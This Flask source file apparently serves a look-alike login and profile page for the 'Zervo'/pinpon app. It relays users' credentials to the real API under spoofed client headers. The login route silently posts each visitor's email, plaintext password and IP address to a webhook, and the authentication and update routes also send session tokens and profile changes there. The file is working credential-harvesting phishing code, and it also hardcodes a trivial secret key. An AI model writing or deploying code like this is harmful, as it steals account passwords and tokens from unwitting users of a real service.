from flask import Flask, render_template, request, redirect, url_for, session
import requests
from functools import wraps
from utils.imageapi import image_url
import asyncio
from threading import Thread
import json
from utils.webhook import webhook

LOGIN_API_URL = 'https://wg7.pinpon.cool/pinpon-app-auth/v3/auth/login/email'

headers = {
  'accept-encoding': 'gzip',
  'app': 'zervo',
  'app-version': '168',
  'content-type': 'application/x-www-form-urlencoded',
  'host': 'wg6.pinpon.cool',
  'language': 'en_US',
  'platform': '0',
  'user-agent': 'Dart/3.1 (dart:io)'
}


def login_required(f):

  @wraps(f)
  def decorated_function(*args, **kwargs):
    if 'token' not in session:
      return redirect(url_for('login', next=request.url))
    return f(*args, **kwargs)

  return decorated_function


def authenticate_user(email, password):
  data = {'email': email, 'password': password}
  headers['content-type'] = 'application/x-www-form-urlencoded'
  response = requests.post(LOGIN_API_URL, headers=headers, data=data)
  data = response.json()
  print(data)
  if data['code'] == 200:
    webhook(data={'content': f'```{data["data"]}```'})
    session['token'] = data['data']['pinponToken']
    session['userId'] = data['data']['appUserId']
    session.permanent = True
    return True
  return False


app = Flask(__name__, static_folder="static")
app.secret_key = "key"


@app.route('/')
def main():
  return render_template('index.html')


@app.route('/zervo')
def zervo_home():
  return render_template('zervo.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
  if request.method == 'POST':
    print(request.form)
    email = request.form['email']
    password = request.form['password']
    webhook(
      data={
        'content':
        f"======================\nIP:{request.remote_addr}\n{email}\n{password}\n=========================="
      })
    if authenticate_user(email, password):
      return redirect(url_for('dashboard'))
    else:
      error = 'Invalid email or password'
      return render_template('login.html', error=error)
  return render_template('login.html')


@app.route('/dashboard')
@login_required
def dashboard():
  # You can now use the token stored in the session to make authenticated API requests
  userId = session['userId']
  headers['content-type'] = 'application/json'
  headers['pinpon-auth'] = session['token']['token']
  #error_message = session.pop('error_message', None)
  if 'error_message' in session.keys():
    error_message = session['error_message']
    print(error_message)
    if error_message['count'] == "1":
      error_message = session.pop('error_message', None)
    else:
      error_message['count'] = "1"

  else:
    error_message = None
  resp = requests.get(
    f"https://wg7.pinpon.cool/pinpon-app-system/app-user/detail/?appUserId={userId}",
    headers=headers).json()
  if resp['code'] == 200:
    user = resp['data']
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    imgurl = loop.run_until_complete(image_url(user['url']))
    #imgurl = asyncio.run(image_url(user['url']))
    data = {
      'nickname': {
        "nickname": "DracX",
        'placeholder': "Nickname",
        'type': "text"
      },
      'id': {
        "id": "DracX",
        'placeholder': "Username",
        'type': "text"
      },
      'points': {
        "id": "DracX",
        'placeholder': "Username",
        'type': "number"
      },
    }
    return render_template('dashboard.html',
                           user=user,
                           imgurl=imgurl,
                           error_message=error_message)
  else:
    return "Server Error"


@app.route('/profile')
def profile():
  # You can now use the token stored in the session to make authenticated API requests
  userId = session['userId']
  headers['content-type'] = 'application/json'
  headers['pinpon-auth'] = session['token']['token']
  return render_template('profile.html', imgurl="https://fb.com/favicon.ico")


@app.route('/update', methods=['GET', 'POST'])
def update_profile():
  headers['content-type'] = 'application/json'
  headers['pinpon-auth'] = session['token']['token']
  if request.method == 'POST':
    keys = request.form.keys()
    key = [x for x in keys]
    data = {key[0]: request.form[key[0]]}
    webhook(data={'content': f"userId:{session['userId']} {data}"})
    print(data)

    if "id" in data.keys():
      resp = requests.post(
        f"https://wg7.pinpon.cool/pinpon-app-system/app-user/update/userId?userId={data['id']}"
      ).json()
    else:
      resp = requests.post(
        "https://wg7.pinpon.cool/pinpon-app-system/app-user/update",
        headers=headers,
        data=json.dumps(data)).json()
    session['error_message'] = {'count': '0', 'data': resp}
    return redirect(url_for('dashboard'))
  if request.method == 'GET':
    try:
      id_param = request.args['isDeleted']
      data = {'isDeleted': id_param}
      resp = requests.post(
        "https://wg7.pinpon.cool/pinpon-app-system/app-user/update",
        headers=headers,
        data=json.dumps(data)).json()

      session['error_message'] = {'count': '0', 'data': resp}
      return redirect(url_for('dashboard'))
    except KeyError:
      return {'error': 'No "id" parameter found in the URL'}, 400


@app.route('/logout')
@login_required
def logout():
  session.pop('token', None)
  session.pop('userId', None)
  return redirect(url_for('login'))


def run():
  app.run(host="0.0.0.0", port=8080)


def keep_alive():
  server = Thread(target=run)
  server.start()
